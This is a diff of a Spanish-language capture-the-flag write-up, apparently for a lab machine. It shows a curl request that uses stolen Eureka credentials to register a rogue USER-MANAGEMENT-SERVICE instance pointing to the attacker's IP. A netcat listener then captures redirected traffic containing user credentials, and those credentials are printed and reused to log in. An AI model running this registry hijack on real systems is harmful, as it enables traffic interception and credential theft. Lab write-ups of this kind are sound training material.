@@ -168,9 +168,8 @@ tambien conseguimos un articulo que habla de como podemos abusar de esto creando
 
 >>> https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka
 
-el objetivo va ser registrar un nuevo micro-servicio falso, para esto lo que haremos sera registrar uno nuevo que se haga pasar por uno ya existente, ya que si registramos uno con el mismo nombre de uno ya existente el sistema lo sobreescribe!!
-
-lo primero que haremos sera crear el micro-servicio y no comunicaremos con `eureka` como indica el articulo con una solicitu como esta:
+pero el objetivo de nosotros no sera crear un micro-servicio falso sino crear una instancia bajo el micro-servicio `USER-MANAGEMENT-SERVICE`.
+Para crear la instancia lo hacemos tal cual como si crearamos un micro-servicio, manejamos la misma peticion del articulo.
 
 ```bash
 POST /eureka/apps/WEBSERVICE HTTP/1.1
@@ -185,7 +184,7 @@ Content-Length: 1015
 {"instance":{"instanceId":"host.docker.internal:webservice:8082","app":"WEBSERVICE","appGroupName":null,"ipAddr":"192.168.2.1","sid":"na","homePageUrl":"http://host.docker.internal:8082/","statusPageUrl":"http://host.docker.internal:8082/actuator/info","healthCheckUrl":"http://host.docker.internal:8082/actuator/health","secureHealthCheckUrl":null,"vipAddress":"webservice","secureVipAddress":"webservice","countryId":1,"dataCenterInfo":{"@class":"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo","name":"MyOwn"},"hostName":"host.docker.internal","status":"UP","overriddenStatus":"UNKNOWN","leaseInfo":{"renewalIntervalInSecs":30,"durationInSecs":90,"registrationTimestamp":0,"lastRenewalTimestamp":0,"evictionTimestamp":0,"serviceUpTimestamp":0},"isCoordinatingDiscoveryServer":false,"lastUpdatedTimestamp":1630906180645,"lastDirtyTimestamp":1630906182808,"actionType":null,"asgName":null,"port":{"$":8082,"@enabled":"true"},"securePort":{"$":443,"@enabled":"false"},"metadata":{"management.port":"8082"}}}
 ```
 
-ahora vamos a identificar el micro-servicio a suplantar:
+ahora vamos a identificar el micro-servicio:
 
 
 <img width="1920" height="272" alt="image" src="https://github.com/user-attachments/assets/caea5003-e5d8-4866-9f17-ac14c8d77530" />
@@ -236,18 +235,57 @@ curl http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE -u EurekaSrvr:0sc
   </instance>
 ```
 
-estos datos los vamos a modificar para crear el nuevo micro-servicio pero que apunte a nuestra ip de atacante, por lo que desde la sesion ssh que tenemos activa enviamos la siguiente peticion como se indica en el articulo
+no haremos uso de todos los datos aqui expuestos sino solo de los necesarios para crear una instancia, aunque es posible hacer uso de todos los datos en la peticion que enviemos
 
 ```bash
-
+curl -X POST http://127.0.0.1:8761/eureka/apps/USER-MANAGEMENT-SERVICE \
+  -u 'EurekaSrvr:0scarPWDisTheB3st' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "instance": {
+      "instanceId": "USER-MANAGEMENT-SERVICE:8081",
+      "app": "USER-MANAGEMENT-SERVICE",
+      "ipAddr": "10.10.14.160",
+      "port": {"$": 8081, "@enabled": "true"},
+      "status": "UP",
+      "dataCenterInfo": {
+        "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
+        "name": "MyOwn"
+      }
+    }
+  }'
 ```
 
+esto creara una instancia al envia la peticion, haciendo que parte del trafico sea dirigido a nuestra maquina atacante por el puerto `8081` por lo que debemos estar escuchando por este puerto antes de enviar la peticion
 
+```bash
+nc -lnvp 8081
+```
 
+enviamos la peticion desde la sesion `ssh` del usuario `oscar190` y vemos que se actualiza `eureka` con la nueva instancia
 
+<img width="1920" height="836" alt="image" src="https://github.com/user-attachments/assets/98383643-ebee-4ccf-bfb7-c6b54e565da3" />
 
+tambien recibimos trafico por donde estamos en escucha con netcat
 
+<img width="1920" height="436" alt="image" src="https://github.com/user-attachments/assets/b29dc55a-6e45-4d1b-8768-55fb0cc29dd4" />
 
+capturamos credenciales nuevas y para verlas claramente sin el urlencodeo usamos `urlencode`
 
+<img width="1920" height="587" alt="image" src="https://github.com/user-attachments/assets/dc07a7a0-de3c-494a-8eaa-12a0ed06a9b6" />
 
+ahora tenemos en claro las credenciales `miranda.wise:IL!veT0Be&BeT0L0ve`
 
+que si testeamos la password contra el usuario de sistema `miranda-wise` logramos loguearnos.
+
+<img width="1920" height="169" alt="image" src="https://github.com/user-attachments/assets/cd4e650f-1752-446e-ad17-510e782b7607" />
+
+### esquema del ataque
+
+```mermaid
+sequenceDiagram
+    APP-GATEWAY->>Eureka: "¿Dónde está USER-MANAGEMENT-SERVICE?"
+    Eureka-->>APP-GATEWAY: ["localhost:8081", "10.10.14.160:8081"]
+    APP-GATEWAY->>Servicio Falso: 50% del tráfico
+    APP-GATEWAY->>Servicio Real: 50% del tráfico
+```
